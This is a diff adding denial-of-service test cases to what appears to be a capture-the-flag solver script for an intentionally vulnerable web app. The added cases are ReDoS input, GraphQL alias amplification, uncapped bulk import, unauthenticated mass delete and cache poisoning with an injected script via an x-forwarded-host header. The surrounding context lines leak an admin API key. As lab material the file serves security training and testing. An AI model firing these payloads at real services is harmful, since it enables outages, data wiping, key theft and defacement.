@@ -182,6 +182,16 @@ ok(49, 'specter_audit_evasion', (await txt('/api/admin/action', J({ action: 'del
 { const cfg = JSON.parse((await txt('/api/config')).body); // leak the ADMIN_API_KEY
   ok(50, 'specter_second_order', (await txt('/api/staff/tools', { headers: { 'x-support-override': cfg.ADMIN_API_KEY } })).body.includes('lj_support_override_backdoor')); }
 
+// ─────────────────────── v6 BURN1T (chaos / DoS) ───────────────────────
+ok(51, 'burn_redos', (await txt('/api/promo/validate', J({ code: 'aaaaaaaaaaaaaaaaaaaaaaa!' }))).body.includes('lj_redos_promo'));
+{ const aliases = Array.from({ length: 900 }, (_, i) => `a${i}:products{name}`).join(' ');
+  ok(52, 'burn_gql_amplification', (await txt('/graphql', J({ query: `{ ${aliases} }` }))).body.includes('lj_graphql_alias_amplification')); }
+{ const items = Array.from({ length: 2000 }, (_, i) => ({ name: 'x' + i }));
+  ok(53, 'burn_mass_import', (await txt('/api/import/bulk', J({ items }))).body.includes('lj_uncapped_bulk_import')); }
+ok(54, 'burn_mass_delete', (await txt('/api/admin/wipe', J({}))).body.includes('lj_unauth_mass_delete'));
+{ await txt('/promo-banner.css', { headers: { 'x-forwarded-host': 'evil.example/"><script>x</script>' } }); // poison
+  ok(55, 'burn_cache_poison', (await txt('/promo-banner.css')).body.includes('lj_cache_poison_deface')); }        // served from cache
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
